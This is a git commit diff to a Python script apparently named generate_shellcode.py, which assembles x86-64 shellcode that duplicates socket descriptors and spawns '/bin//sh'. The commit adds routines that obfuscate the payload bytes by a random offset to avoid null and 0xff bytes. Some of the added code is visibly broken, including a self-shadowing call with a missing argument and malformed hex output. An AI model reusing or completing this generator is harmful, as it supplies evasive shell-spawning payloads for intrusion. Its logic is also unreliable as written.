ad2c00fb61095c2a91a7a40a3737a55e5fd77514
Dupety Gabriel <gabdupety@hotmail.fr>
2023-03-01 11:41:25 +0100

    offuscation

--- generate_shellcode.py
+++ generate_shellcode.py
@@ -3,7 +3,74 @@
 from random import randint as r
 import socket
 from sys import argv
+
 #import htons
+
+def verifOffus(binBashHexa):
+    for i in range(0,18,2):
+        if i == 0 :
+                continue
+        
+        sub ="0x"+binBashHexa[i] + binBashHexa[i+1]
+        numInHex = int(sub,16)
+        if numInHex == int("0x00",16) or numInHex == int("0xff",16) :
+            return False
+    return True
+
+
+def factorOffus(string4Payload):
+    if verifOffus(string4Payload) == False:
+        return string4Payload
+
+    global PAYLOAD
+    arr = []
+    ope = r(1,2)
+   
+    for i in range(0,18,2):
+        if i == 0 :
+                continue
+        
+        sub ="0x"+string4Payload[i] + string4Payload[i+1]
+        numInHex = int(sub,16)
+        print(sub, numInHex)
+
+        for j in range(1,15):
+            
+            
+            if ope == 1 :
+                tmp = numInHex - j
+                
+                if tmp < 255 and tmp > 0:
+                    arr.append(j)
+                else:
+                    break
+
+            if ope == 2 :
+                tmp = numInHex + j
+                if tmp < 255 and tmp > 0:
+                    arr.append(j)
+                else:
+                    break
+
+    arr[:] = list(set(arr)) #Rend unique chaque valeurs
+    rand = r(arr[0],arr[-1])
+    #print ("Random = ", rand, type(rand) )
+
+    return rand
+
+def offus(string4Payload, rand):
+    newString = "0x"
+
+    for i in range(0,16,2):
+        if i == 0 :
+                continue
+        
+        sub = string4Payload[i] + string4Payload[i+1]
+        numInHex = int(sub,16) + rand
+        newString = newString + str(numInHex)
+    
+    return newString
+
 
 def clean(reg):
     if str(reg) == "rax":
@@ -65,9 +132,15 @@ def dup2x3():
         PAYLOAD += call()
 
 
-#def shell():
-    #global PAYLOAD
 
+def shell():
+    global PAYLOAD
+    PAYLOAD+=clean("rax")
+    PAYLOAD+=clean("rdx")
+    factorOffus = factorOffus()
+    offus("0x68732f6e69622f2f", factorOffus)
+
+    
 def _exit():
     global PAYLOAD
     PAYLOAD+=clean("rax")
